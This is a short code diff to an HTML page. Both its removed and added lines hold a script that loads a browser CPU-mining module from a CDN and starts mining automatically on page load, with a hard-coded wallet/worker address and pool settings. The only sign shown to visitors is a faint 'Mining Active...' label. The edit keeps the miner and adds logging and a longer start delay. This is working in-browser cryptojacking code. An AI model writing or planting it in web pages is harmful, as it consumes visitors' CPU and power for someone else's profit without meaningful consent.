@@ -8,20 +8,21 @@
 <body>
   <div style="position:fixed;top:10px;left:10px;color:rgba(255,255,255,0.4);">Mining Active...</div>
   <script type="module">
-    import * as m from 'https://esm.run/@marco_ciaramella/cpu-web-miner';
-    async function startMining() {
-      const cfg = {
-        server: "127.0.0.1",
-        port: 8080,
-        worker: "Wa8mFnYAtLeiaAmEsuMqtaHYxFFxpAAVZm.worker1",
-        password: "c=SWAMP,mc=SWAMP,zap=SWAMP",
-        ssl: false
-      };
-      m.start(m.yespower, cfg, null, -1, () => {}, (hr) => {
-        console.log("Hashrate:", hr);
-      }, console.error);
-    }
-    window.onload = () => setTimeout(startMining, 800);
-  </script>
+  import * as m from 'https://esm.run/@marco_ciaramella/cpu-web-miner';
+  async function startMining() {
+    const cfg = {
+      server: "127.0.0.1",
+      port: 8080,
+      worker: "Wa8mFnYAtLeiaAmEsuMqtaHYxFFxpAAVZm.worker1",
+      password: "c=SWAMP,mc=SWAMP,zap=SWAMP",
+      ssl: false
+    };
+    console.log("Starting miner...");
+    m.start(m.yespower, cfg, null, -1, () => {}, (hr) => {
+      console.log("Hashrate:", hr);
+    }, (err) => console.error("Miner error:", err));
+  }
+  window.onload = () => setTimeout(startMining, 1000);
+</script>
 </body>
 </html>
